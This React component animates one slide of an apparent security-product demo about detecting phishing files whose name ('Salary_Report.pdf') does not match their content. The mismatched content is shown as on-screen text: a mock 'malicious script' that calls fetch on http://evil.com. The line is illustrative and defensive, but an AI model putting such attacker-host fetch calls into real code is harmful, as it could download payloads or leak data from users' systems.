import { motion } from 'framer-motion';
import { FileText, AlertTriangle, Unlink } from 'lucide-react';

export function Scene5() {
  return (
    <motion.div 
      className="absolute inset-0 flex flex-col items-center justify-center z-20"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.8 }}
    >
      <motion.div
        initial={{ y: -30, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 0.2 }}
        className="text-center mb-[8vh]"
      >
        <h1 className="text-5xl font-bold font-display mb-4">Subject-Body <span className="text-orange-400">Context Mismatch</span></h1>
        <p className="text-2xl text-orange-200/80 mb-2 font-mono">제목-내용 맥락 불일치 탐지</p>
        <p className="text-xl font-mono text-slate-400">파일 제목과 본문 의미 불일치로 피싱·위장 판단</p>
      </motion.div>

      <div className="flex items-center gap-[2vw] relative w-full max-w-5xl justify-center">
        {/* Subject Card */}
        <motion.div
          initial={{ x: -100, opacity: 0 }}
          animate={{ x: 0, opacity: 1 }}
          transition={{ delay: 0.6, type: 'spring' }}
          className="bg-slate-800 border border-slate-700 w-[20vw] p-[1.5vw] rounded-xl relative shadow-lg"
        >
          <div className="text-xs text-slate-400 mb-2 uppercase tracking-wider">File Subject</div>
          <div className="flex items-center gap-3 text-xl font-bold text-white">
            <FileText className="text-blue-400" />
            Salary_Report.pdf
          </div>
        </motion.div>

        {/* Separator / AI Analysis */}
        <motion.div
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ delay: 1.4, type: 'spring' }}
          className="z-10 bg-red-500 rounded-full p-4 shadow-[0_0_30px_rgba(239,68,68,0.5)]"
        >
          <Unlink size={40} className="text-white" />
        </motion.div>

        {/* Body Card */}
        <motion.div
          initial={{ x: 100, opacity: 0 }}
          animate={{ x: 0, opacity: 1 }}
          transition={{ delay: 0.8, type: 'spring' }}
          className="bg-slate-800 border border-red-900/50 w-[20vw] p-[1.5vw] rounded-xl relative shadow-lg overflow-hidden"
        >
          <motion.div 
            className="absolute inset-0 bg-red-500/10"
            animate={{ opacity: [0.1, 0.3, 0.1] }}
            transition={{ duration: 2, repeat: Infinity }}
          />
          <div className="text-xs text-slate-400 mb-2 uppercase tracking-wider">File Content</div>
          <div className="text-sm font-mono text-red-300">
            [MALICIOUS SCRIPT]<br/>
            function drop() {'{'}<br/>
            &nbsp;&nbsp;fetch('http://evil.com')<br/>
            {'}'}
          </div>
        </motion.div>
        
        {/* Alert badge */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 2 }}
          className="absolute bottom-[1vh] left-1/2 -translate-x-1/2 bg-red-950/80 border border-red-500 px-[1.5vw] py-[0.75vw] rounded-full flex items-center gap-[0.75vw] text-red-400 font-bold"
        >
          <AlertTriangle size={24} />
          MISMATCH DETECTED
        </motion.div>
      </div>
    </motion.div>
  );
}
